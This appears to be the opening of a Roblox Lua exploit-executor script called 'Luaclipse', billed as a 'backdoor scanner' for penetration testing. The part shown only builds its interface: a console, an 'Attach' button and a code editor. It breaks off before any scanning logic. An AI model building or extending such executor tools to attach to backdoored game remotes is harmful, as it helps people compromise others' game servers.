--[====================================================================================================[

    ▄█       ███    █▄     ▄████████  ▄████████  ▄█        ▄█     ▄███████▄    ▄████████    ▄████████ 
   ███       ███    ███   ███    ███ ███    ███ ███       ███    ███    ███   ███    ███   ███    ███ 
   ███       ███    ███   ███    ███ ███    █▀  ███       ███▌   ███    ███   ███    █▀    ███    █▀  
   ███       ███    ███   ███    ███ ███        ███       ███▌   ███    ███   ███         ▄███▄▄▄     
   ███       ███    ███ ▀███████████ ███        ███       ███▌ ▀█████████▀  ▀███████████ ▀▀███▀▀▀     
   ███       ███    ███   ███    ███ ███    █▄  ███       ███    ███                 ███   ███    █▄  
   ███▌    ▄ ███    ███   ███    ███ ███    ███ ███▌    ▄ ███    ███           ▄█    ███   ███    ███ 
   █████▄▄██ ████████▀    ███    █▀  ████████▀  █████▄▄██ █▀    ▄████▀       ▄████████▀    ██████████ v1
   ▀                                            ▀                                                     
   
   Created by: C:\Drive
   Last updated: 10.3.25
   
   Luaclipse is a free and open sourced backdoor scanner which purpose is only for penetration testing
   purposes only. Anyone caught or trying to use this script for malicous activities will be blacklisted
   with no repeal.
   
   Changes:
      [+] Fixed RemoteFunction support
      [+] Added more checks
      [+] Made the scanner faster
      
   Credits:
      C:\Drive - Scripting, GUI, and Documentation
      You - For using Luaclipse and reporting major issues to me
    
   Note: This script can work on level executor ranges from 3 - 8 so you can use it on basically anything
   
]====================================================================================================]--

local LUA = {};

-- StarterGui.Luaclipse
LUA["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
LUA["1"]["DisplayOrder"] = 1999999999;
LUA["1"]["Enabled"] = true;
LUA["1"]["Name"] = [[Luaclipse]];
LUA["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
LUA["1"]["ResetOnSpawn"] = false;


-- StarterGui.Luaclipse.TopBar
LUA["2"] = Instance.new("Frame", LUA["1"]);
LUA["2"]["Active"] = true;
LUA["2"]["BorderSizePixel"] = 2;
LUA["2"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
LUA["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
LUA["2"]["Size"] = UDim2.new(0, 320, 0, 54);
LUA["2"]["Position"] = UDim2.new(0.5, 0, 0.5, -150);
LUA["2"]["BorderColor3"] = Color3.fromRGB(33, 33, 33);
LUA["2"]["Name"] = [[TopBar]];


-- StarterGui.Luaclipse.TopBar.Title
LUA["3"] = Instance.new("TextLabel", LUA["2"]);
LUA["3"]["BorderSizePixel"] = 0;
LUA["3"]["TextSize"] = 42;
LUA["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Heavy, Enum.FontStyle.Normal);
LUA["3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LUA["3"]["BackgroundTransparency"] = 1;
LUA["3"]["Size"] = UDim2.new(0, 0, 1, -2);
LUA["3"]["Text"] = [[Luaclipse]];
LUA["3"]["AutomaticSize"] = Enum.AutomaticSize.X;
LUA["3"]["Name"] = [[Title]];
LUA["3"]["Position"] = UDim2.new(0, 5, 0, 0);


-- StarterGui.Luaclipse.TopBar.Line
LUA["4"] = Instance.new("Frame", LUA["2"]);
LUA["4"]["BorderSizePixel"] = 0;
LUA["4"]["BackgroundColor3"] = Color3.fromRGB(126, 126, 126);
LUA["4"]["Size"] = UDim2.new(1, 0, 0, 2);
LUA["4"]["Position"] = UDim2.new(0, 0, 1, -2);
LUA["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["4"]["Name"] = [[Line]];


-- StarterGui.Luaclipse.TopBar.Exit
LUA["5"] = Instance.new("TextButton", LUA["2"]);
LUA["5"]["TextWrapped"] = true;
LUA["5"]["BorderSizePixel"] = 0;
LUA["5"]["AutoLocalize"] = false;
LUA["5"]["TextSize"] = 14;
LUA["5"]["AutoButtonColor"] = false;
LUA["5"]["TextScaled"] = true;
LUA["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LUA["5"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
LUA["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Heavy, Enum.FontStyle.Normal);
LUA["5"]["Size"] = UDim2.new(0, 52, 1, -2);
LUA["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["5"]["Text"] = [[X]];
LUA["5"]["Name"] = [[Exit]];
LUA["5"]["Position"] = UDim2.new(1, -52, 0, 0);


-- StarterGui.Luaclipse.TopBar.MainFrame
LUA["6"] = Instance.new("Frame", LUA["2"]);
LUA["6"]["BorderSizePixel"] = 2;
LUA["6"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
LUA["6"]["ClipsDescendants"] = true;
LUA["6"]["Size"] = UDim2.new(1, 0, 0, 350);
LUA["6"]["Position"] = UDim2.new(0, 0, 1, 2);
LUA["6"]["BorderColor3"] = Color3.fromRGB(33, 33, 33);
LUA["6"]["Name"] = [[MainFrame]];


-- StarterGui.Luaclipse.TopBar.MainFrame.Console
LUA["7"] = Instance.new("ScrollingFrame", LUA["6"]);
LUA["7"]["Active"] = true;
LUA["7"]["BorderSizePixel"] = 2;
LUA["7"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
LUA["7"]["TopImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
LUA["7"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
LUA["7"]["Name"] = [[Console]];
LUA["7"]["BottomImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
LUA["7"]["AnchorPoint"] = Vector2.new(0.5, 0);
LUA["7"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
LUA["7"]["Size"] = UDim2.new(1, -32, 0, 250);
LUA["7"]["Position"] = UDim2.new(0.5, 0, 0, 16);
LUA["7"]["BorderColor3"] = Color3.fromRGB(33, 33, 33);
LUA["7"]["ScrollBarThickness"] = 0;


-- StarterGui.Luaclipse.TopBar.MainFrame.Console.Example
LUA["8"] = Instance.new("TextLabel", LUA["7"]);
LUA["8"]["TextWrapped"] = true;
LUA["8"]["BorderSizePixel"] = 0;
LUA["8"]["TextSize"] = 20;
LUA["8"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LUA["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LUA["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LUA["8"]["BackgroundTransparency"] = 1;
LUA["8"]["Size"] = UDim2.new(1, 0, 0, 0);
LUA["8"]["Visible"] = false;
LUA["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["8"]["Text"] = [[ Scanning: whatever]];
LUA["8"]["AutomaticSize"] = Enum.AutomaticSize.Y;
LUA["8"]["Name"] = [[Example]];


-- StarterGui.Luaclipse.TopBar.MainFrame.Console.UIListLayout
LUA["9"] = Instance.new("UIListLayout", LUA["7"]);
LUA["9"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Luaclipse.TopBar.MainFrame.Attach
LUA["a"] = Instance.new("TextButton", LUA["6"]);
LUA["a"]["BorderSizePixel"] = 2;
LUA["a"]["TextSize"] = 42;
LUA["a"]["AutoButtonColor"] = false;
LUA["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LUA["a"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
LUA["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LUA["a"]["AnchorPoint"] = Vector2.new(0.5, 0);
LUA["a"]["Size"] = UDim2.new(1, -32, 0, 50);
LUA["a"]["BorderColor3"] = Color3.fromRGB(33, 33, 33);
LUA["a"]["Text"] = [[Attach]];
LUA["a"]["Name"] = [[Attach]];
LUA["a"]["Position"] = UDim2.new(0.5, 0, 0, 285);


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox
LUA["b"] = Instance.new("Frame", LUA["6"]);
LUA["b"]["Visible"] = false;
LUA["b"]["BorderSizePixel"] = 2;
LUA["b"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
LUA["b"]["AnchorPoint"] = Vector2.new(0.5, 0);
LUA["b"]["Size"] = UDim2.new(1, -32, 0, 250);
LUA["b"]["Position"] = UDim2.new(0.5, 0, 0, 16);
LUA["b"]["BorderColor3"] = Color3.fromRGB(33, 33, 33);
LUA["b"]["Name"] = [[FastColoredTextbox]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Scroll
LUA["c"] = Instance.new("ScrollingFrame", LUA["b"]);
LUA["c"]["Active"] = true;
LUA["c"]["ZIndex"] = 2;
LUA["c"]["BorderSizePixel"] = 0;
LUA["c"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
LUA["c"]["TopImage"] = [[]];
LUA["c"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
LUA["c"]["Name"] = [[Scroll]];
LUA["c"]["BottomImage"] = [[]];
LUA["c"]["Size"] = UDim2.new(1, 0, 1, 0);
LUA["c"]["ScrollBarImageColor3"] = Color3.fromRGB(43, 43, 43);
LUA["c"]["BorderColor3"] = Color3.fromRGB(127, 129, 126);
LUA["c"]["ScrollBarThickness"] = 17;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Scroll.TextBox
LUA["d"] = Instance.new("TextBox", LUA["c"]);
LUA["d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LUA["d"]["BorderSizePixel"] = 0;
LUA["d"]["TextWrapped"] = true;
LUA["d"]["TextTransparency"] = 0.75;
LUA["d"]["TextSize"] = 15;
LUA["d"]["TextColor3"] = Color3.fromRGB(42, 42, 42);
LUA["d"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LUA["d"]["BackgroundColor3"] = Color3.fromRGB(29, 35, 46);
LUA["d"]["RichText"] = true;
LUA["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LUA["d"]["MultiLine"] = true;
LUA["d"]["ClearTextOnFocus"] = false;
LUA["d"]["Size"] = UDim2.new(10, -27, 1, 0);
LUA["d"]["Position"] = UDim2.new(0, 17, 0, 0);
LUA["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["d"]["Text"] = [[]];
LUA["d"]["BackgroundTransparency"] = 1;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Scroll.Highlighting
LUA["e"] = Instance.new("TextLabel", LUA["c"]);
LUA["e"]["TextWrapped"] = true;
LUA["e"]["BorderSizePixel"] = 0;
LUA["e"]["TextSize"] = 15;
LUA["e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LUA["e"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LUA["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LUA["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LUA["e"]["BackgroundTransparency"] = 1;
LUA["e"]["RichText"] = true;
LUA["e"]["Size"] = UDim2.new(10, -27, 1, 0);
LUA["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["e"]["Text"] = [[]];
LUA["e"]["Name"] = [[Highlighting]];
LUA["e"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Scroll.LineSelector
LUA["f"] = Instance.new("Frame", LUA["c"]);
LUA["f"]["ZIndex"] = -7;
LUA["f"]["BorderSizePixel"] = 0;
LUA["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["f"]["Size"] = UDim2.new(1, 0, 0, 15);
LUA["f"]["Position"] = UDim2.new(0, 20, 0, 0);
LUA["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["f"]["Name"] = [[LineSelector]];
LUA["f"]["BackgroundTransparency"] = 1;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Scroll.Cursor
LUA["10"] = Instance.new("Frame", LUA["c"]);
LUA["10"]["BorderSizePixel"] = 0;
LUA["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["10"]["Size"] = UDim2.new(0, 1, 0, 15);
LUA["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["10"]["Name"] = [[Cursor]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Scroll.TextMeasurer
LUA["11"] = Instance.new("TextLabel", LUA["c"]);
LUA["11"]["BorderSizePixel"] = 0;
LUA["11"]["TextSize"] = 15;
LUA["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LUA["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LUA["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LUA["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LUA["11"]["BackgroundTransparency"] = 1;
LUA["11"]["RichText"] = true;
LUA["11"]["Size"] = UDim2.new(10, -27, 1, 0);
LUA["11"]["Visible"] = false;
LUA["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["11"]["Text"] = [[]];
LUA["11"]["Name"] = [[TextMeasurer]];
LUA["11"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Scroll.LinesValue
LUA["12"] = Instance.new("NumberValue", LUA["c"]);
LUA["12"]["Name"] = [[LinesValue]];
LUA["12"]["Value"] = 1;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Scroll.LinesFrame
LUA["13"] = Instance.new("Frame", LUA["c"]);
LUA["13"]["BorderSizePixel"] = 0;
LUA["13"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LUA["13"]["Size"] = UDim2.new(0, 17, 17.91826, 0);
LUA["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["13"]["Name"] = [[LinesFrame]];
LUA["13"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Scroll.LinesFrame.TextLabelTemplate
LUA["14"] = Instance.new("TextLabel", LUA["13"]);
LUA["14"]["TextWrapped"] = true;
LUA["14"]["BorderSizePixel"] = 0;
LUA["14"]["TextSize"] = 15;
LUA["14"]["TextScaled"] = true;
LUA["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LUA["14"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
LUA["14"]["BackgroundTransparency"] = 1;
LUA["14"]["Size"] = UDim2.new(0, 17, 0, 15);
LUA["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["14"]["Text"] = [[1]];
LUA["14"]["Name"] = [[TextLabelTemplate]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Scroll.LinesFrame.UIListLayout
LUA["15"] = Instance.new("UIListLayout", LUA["13"]);
LUA["15"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Handler
LUA["16"] = Instance.new("LocalScript", LUA["b"]);
LUA["16"]["Name"] = [[Handler]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Top
LUA["17"] = Instance.new("Frame", LUA["b"]);
LUA["17"]["Visible"] = false;
LUA["17"]["ZIndex"] = 3;
LUA["17"]["BorderSizePixel"] = 0;
LUA["17"]["BackgroundColor3"] = Color3.fromRGB(55, 55, 55);
LUA["17"]["Size"] = UDim2.new(0, 17, 0, 17);
LUA["17"]["Position"] = UDim2.new(1, -17, 0, 0);
LUA["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["17"]["Name"] = [[Y_Top]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Top.Arrow
LUA["18"] = Instance.new("Frame", LUA["17"]);
LUA["18"]["Size"] = UDim2.new(0, 16, 0, 16);
LUA["18"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
LUA["18"]["Name"] = [[Arrow]];
LUA["18"]["BackgroundTransparency"] = 1;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Top.Arrow.Frame
LUA["19"] = Instance.new("Frame", LUA["18"]);
LUA["19"]["BorderSizePixel"] = 0;
LUA["19"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["19"]["Size"] = UDim2.new(0, 7, 0, 1);
LUA["19"]["Position"] = UDim2.new(0, 5, 0, 9);
LUA["19"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
LUA["19"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Top.Arrow.Frame
LUA["1a"] = Instance.new("Frame", LUA["18"]);
LUA["1a"]["BorderSizePixel"] = 0;
LUA["1a"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["1a"]["Size"] = UDim2.new(0, 5, 0, 1);
LUA["1a"]["Position"] = UDim2.new(0, 6, 0, 8);
LUA["1a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
LUA["1a"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Top.Arrow.Frame
LUA["1b"] = Instance.new("Frame", LUA["18"]);
LUA["1b"]["BorderSizePixel"] = 0;
LUA["1b"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["1b"]["Size"] = UDim2.new(0, 3, 0, 1);
LUA["1b"]["Position"] = UDim2.new(0, 7, 0, 7);
LUA["1b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
LUA["1b"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Top.Arrow.Frame
LUA["1c"] = Instance.new("Frame", LUA["18"]);
LUA["1c"]["BorderSizePixel"] = 0;
LUA["1c"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["1c"]["Size"] = UDim2.new(0, 1, 0, 1);
LUA["1c"]["Position"] = UDim2.new(0, 8, 0, 6);
LUA["1c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
LUA["1c"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Top.Button
LUA["1d"] = Instance.new("TextButton", LUA["17"]);
LUA["1d"]["BorderSizePixel"] = 0;
LUA["1d"]["TextSize"] = 14;
LUA["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
LUA["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LUA["1d"]["BackgroundTransparency"] = 1;
LUA["1d"]["Size"] = UDim2.new(1, 0, 1, 0);
LUA["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["1d"]["Text"] = [[]];
LUA["1d"]["Name"] = [[Button]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Btm
LUA["1e"] = Instance.new("Frame", LUA["b"]);
LUA["1e"]["Visible"] = false;
LUA["1e"]["ZIndex"] = 3;
LUA["1e"]["BorderSizePixel"] = 0;
LUA["1e"]["BackgroundColor3"] = Color3.fromRGB(55, 55, 55);
LUA["1e"]["Size"] = UDim2.new(0, 17, 0, 17);
LUA["1e"]["Position"] = UDim2.new(1, -17, 1, -17);
LUA["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["1e"]["Name"] = [[Y_Btm]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Btm.Button
LUA["1f"] = Instance.new("TextButton", LUA["1e"]);
LUA["1f"]["BorderSizePixel"] = 0;
LUA["1f"]["TextSize"] = 14;
LUA["1f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
LUA["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LUA["1f"]["BackgroundTransparency"] = 1;
LUA["1f"]["Size"] = UDim2.new(1, 0, 1, 0);
LUA["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["1f"]["Text"] = [[]];
LUA["1f"]["Name"] = [[Button]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Btm.Arrow
LUA["20"] = Instance.new("Frame", LUA["1e"]);
LUA["20"]["Size"] = UDim2.new(0, 16, 0, 16);
LUA["20"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
LUA["20"]["Name"] = [[Arrow]];
LUA["20"]["BackgroundTransparency"] = 1;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
LUA["21"] = Instance.new("Frame", LUA["20"]);
LUA["21"]["BorderSizePixel"] = 0;
LUA["21"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["21"]["Size"] = UDim2.new(0, 7, 0, 1);
LUA["21"]["Position"] = UDim2.new(0, 5, 0, 7);
LUA["21"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
LUA["21"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
LUA["22"] = Instance.new("Frame", LUA["20"]);
LUA["22"]["BorderSizePixel"] = 0;
LUA["22"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["22"]["Size"] = UDim2.new(0, 5, 0, 1);
LUA["22"]["Position"] = UDim2.new(0, 6, 0, 8);
LUA["22"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
LUA["22"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
LUA["23"] = Instance.new("Frame", LUA["20"]);
LUA["23"]["BorderSizePixel"] = 0;
LUA["23"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["23"]["Size"] = UDim2.new(0, 3, 0, 1);
LUA["23"]["Position"] = UDim2.new(0, 7, 0, 9);
LUA["23"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
LUA["23"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
LUA["24"] = Instance.new("Frame", LUA["20"]);
LUA["24"]["BorderSizePixel"] = 0;
LUA["24"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["24"]["Size"] = UDim2.new(0, 1, 0, 1);
LUA["24"]["Position"] = UDim2.new(0, 8, 0, 10);
LUA["24"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
LUA["24"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Lft
LUA["25"] = Instance.new("Frame", LUA["b"]);
LUA["25"]["Visible"] = false;
LUA["25"]["ZIndex"] = 3;
LUA["25"]["BorderSizePixel"] = 0;
LUA["25"]["BackgroundColor3"] = Color3.fromRGB(55, 55, 55);
LUA["25"]["Size"] = UDim2.new(0, 17, 0, 17);
LUA["25"]["Position"] = UDim2.new(0, 0, 1, -17);
LUA["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["25"]["Name"] = [[X_Lft]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Lft.Button
LUA["26"] = Instance.new("TextButton", LUA["25"]);
LUA["26"]["BorderSizePixel"] = 0;
LUA["26"]["TextSize"] = 14;
LUA["26"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
LUA["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LUA["26"]["BackgroundTransparency"] = 1;
LUA["26"]["Size"] = UDim2.new(1, 0, 1, 0);
LUA["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["26"]["Text"] = [[]];
LUA["26"]["Name"] = [[Button]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Lft.Arrow
LUA["27"] = Instance.new("Frame", LUA["25"]);
LUA["27"]["Size"] = UDim2.new(0, 16, 0, 16);
LUA["27"]["Name"] = [[Arrow]];
LUA["27"]["BackgroundTransparency"] = 1;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Lft.Arrow.Frame
LUA["28"] = Instance.new("Frame", LUA["27"]);
LUA["28"]["BorderSizePixel"] = 0;
LUA["28"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["28"]["Size"] = UDim2.new(0, 1, 0, 1);
LUA["28"]["Position"] = UDim2.new(0, 6, 0, 8);
LUA["28"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Lft.Arrow.Frame
LUA["29"] = Instance.new("Frame", LUA["27"]);
LUA["29"]["BorderSizePixel"] = 0;
LUA["29"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["29"]["Size"] = UDim2.new(0, 1, 0, 3);
LUA["29"]["Position"] = UDim2.new(0, 7, 0, 7);
LUA["29"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Lft.Arrow.Frame
LUA["2a"] = Instance.new("Frame", LUA["27"]);
LUA["2a"]["BorderSizePixel"] = 0;
LUA["2a"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["2a"]["Size"] = UDim2.new(0, 1, 0, 5);
LUA["2a"]["Position"] = UDim2.new(0, 8, 0, 6);
LUA["2a"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Lft.Arrow.Frame
LUA["2b"] = Instance.new("Frame", LUA["27"]);
LUA["2b"]["BorderSizePixel"] = 0;
LUA["2b"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["2b"]["Size"] = UDim2.new(0, 1, 0, 7);
LUA["2b"]["Position"] = UDim2.new(0, 9, 0, 5);
LUA["2b"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Rght
LUA["2c"] = Instance.new("Frame", LUA["b"]);
LUA["2c"]["Visible"] = false;
LUA["2c"]["ZIndex"] = 3;
LUA["2c"]["BorderSizePixel"] = 0;
LUA["2c"]["BackgroundColor3"] = Color3.fromRGB(55, 55, 55);
LUA["2c"]["Size"] = UDim2.new(0, 17, 0, 17);
LUA["2c"]["Position"] = UDim2.new(1, -18, 1, -17);
LUA["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["2c"]["Name"] = [[X_Rght]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Rght.Button
LUA["2d"] = Instance.new("TextButton", LUA["2c"]);
LUA["2d"]["BorderSizePixel"] = 0;
LUA["2d"]["TextSize"] = 14;
LUA["2d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
LUA["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LUA["2d"]["BackgroundTransparency"] = 1;
LUA["2d"]["Size"] = UDim2.new(1, 0, 1, 0);
LUA["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["2d"]["Text"] = [[]];
LUA["2d"]["Name"] = [[Button]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Rght.Arrow
LUA["2e"] = Instance.new("Frame", LUA["2c"]);
LUA["2e"]["Size"] = UDim2.new(0, 16, 0, 16);
LUA["2e"]["Name"] = [[Arrow]];
LUA["2e"]["BackgroundTransparency"] = 1;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Rght.Arrow.Frame
LUA["2f"] = Instance.new("Frame", LUA["2e"]);
LUA["2f"]["BorderSizePixel"] = 0;
LUA["2f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["2f"]["Size"] = UDim2.new(0, 1, 0, 1);
LUA["2f"]["Position"] = UDim2.new(0, 10, 0, 8);
LUA["2f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Rght.Arrow.Frame
LUA["30"] = Instance.new("Frame", LUA["2e"]);
LUA["30"]["BorderSizePixel"] = 0;
LUA["30"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["30"]["Size"] = UDim2.new(0, 1, 0, 3);
LUA["30"]["Position"] = UDim2.new(0, 9, 0, 7);
LUA["30"]["BackgroundTransparency"] = 0.5;


